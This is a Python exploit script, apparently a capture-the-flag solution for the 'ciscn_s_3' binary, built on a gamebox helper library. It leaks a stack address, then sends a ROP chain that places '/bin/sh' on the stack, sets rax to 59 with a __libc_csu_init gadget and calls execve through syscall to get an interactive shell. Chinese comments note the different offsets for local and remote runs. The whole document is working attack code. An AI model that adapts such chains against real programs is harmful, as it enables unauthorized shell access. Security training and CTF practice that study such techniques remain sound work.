import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./ciscn_s_3',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))

s = sgtlibc.Searcher()
elf = client.elf

main_addr = elf.symbols['main']
csu_init_addr = elf.symbols['__libc_csu_init']

rax_59_ret = 0x04004E2
syscall = 0x0400517
payload = [b'a' * 16, main_addr]
# gdb.attach(client.client, 'b 0x0400501')
pause()
sl(payload)
rc(0x20)  # buf size
stack_addr = u00(rc(6))  # leak current ebp

# binsh_addr = stack_addr - 0x138  # 线上则是0x138 # esp - ebp
binsh_addr = stack_addr - 0x148  # 本地运行需要 -0x148
rax_59 = binsh_addr + 0x10
pop_rdi = 0x04005a3
log.info(f'stack_addr:{hex(stack_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')
log.info(f'rax_59:{hex(rax_59)}')


payload = []
payload += [b'/bin/sh\x00', fakeebp(), rax_59_ret]
d = gadgets.gadget_by_csu(
    libc_csu_init_address=csu_init_addr,
    func_to_call=rax_59,
    param1=0,
    param2=0,
    param3=0
)
payload += [gadgets.build(d)]  # set rax to 59
payload += [pop_rdi, binsh_addr]
payload += [syscall]
# syscall_59 (binsh)
sl(payload)
interactive()
